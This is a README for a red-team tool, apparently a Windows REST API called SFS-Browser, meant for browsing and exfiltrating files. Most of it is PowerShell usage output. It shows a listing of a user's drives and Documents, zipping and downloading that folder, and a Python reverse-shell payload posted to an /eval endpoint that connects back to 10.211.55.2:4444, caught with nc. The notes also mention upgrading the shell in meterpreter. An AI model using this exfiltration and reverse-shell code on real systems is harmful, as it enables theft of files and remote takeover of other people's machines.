# SFS-Browser [![](https://ci.appveyor.com/api/projects/status/github/limitedeternity/SFS-Browser)](https://ci.appveyor.com/project/limitedeternity/sfs-browser)
> Personal Red Team Operation Tool: Data Exfiltration REST API

## Usage:
```
PS C:\Users\limitedeternity> Invoke-RestMethod http://localhost:38080/

name type
---- ----
A:   disk
C:   disk
D:   disk
Z:   disk


PS C:\Users\limitedeternity> Invoke-RestMethod http://localhost:38080/C:

name                   type                modified
----                   ----                --------
$Recycle.Bin           directory    1595677350978,4
Documents and Settings directory    1595673448354,0
PerfLogs               directory 1247539025220,0916
Program Files          directory    1619910935484,2
Program Files (x86)    directory    1608297970979,4
ProgramData            directory    1619910502873,0
Users                  directory    1595673448354,0
Windows                directory    1619103971840,0
autoexec.bat           file      1244670140125,8877
config.sys             file      1244670140125,8877
hiberfil.sys           file      1625073190506,4001
pagefile.sys           file         1625073194874,4


PS C:\Users\limitedeternity> Invoke-RestMethod http://localhost:38080/C:/Users/limitedeternity/Documents/

name                   type                modified
----                   ----                --------
Visual Prolog Projects directory    1612371582917,8
Visual Studio 2010     directory    1602501898520,0
bins                   directory 1595846202658,4001
Мои видеозаписи        directory    1595677374596,8
Мои рисунки            directory 1595677374612,4001
Моя музыка             directory    1595677374643,6
desktop.ini            file         1595677374752,8


PS C:\Users\limitedeternity> Invoke-RestMethod http://localhost:38080/C:/Users/limitedeternity/Documents?zip=true

location
--------
C:\Users\limitedeternity\AppData\Local\Temp\tmprwfn3bwj.zip


PS C:\Users\limitedeternity\Downloads> Invoke-RestMethod http://localhost:38080/C:\Users\limitedeternity\AppData\Local\Temp\tmp9i4r3iyh.zip -Outfile test.zip
PS C:\Users\limitedeternity\Downloads> dir

    Directory: C:\Users\limitedeternity\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       30.06.2021     22:17        1801859 test.zip


PS C:\Users\limitedeternity> $body = @{payload="exec(`"import socket, subprocess;s = socket.socket();s.connect(('10.211.55.2',4444))\nwhile True:  proc = subprocess.Popen(s.recv(1024).decode('utf-8'), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True);s.send(b'\\n'.join(proc.communicate()))`")"}
PS C:\Users\limitedeternity> Invoke-RestMethod -Method POST -Uri http://localhost:38080/eval -Body ($body | ConvertTo-JSON) -ContentType "application/json"

❯ nc -lvp 4444
Connection from 10.211.55.6:49259
```

## Notes
* Windows XP+ **ONLY**
* I'm not planning to support every possible platform - I only need Windows
* Zip file gets deleted once downloaded
* I'm not planning to implement file upload functionality – catch a reverse shell in meterpreter and upgrade it 
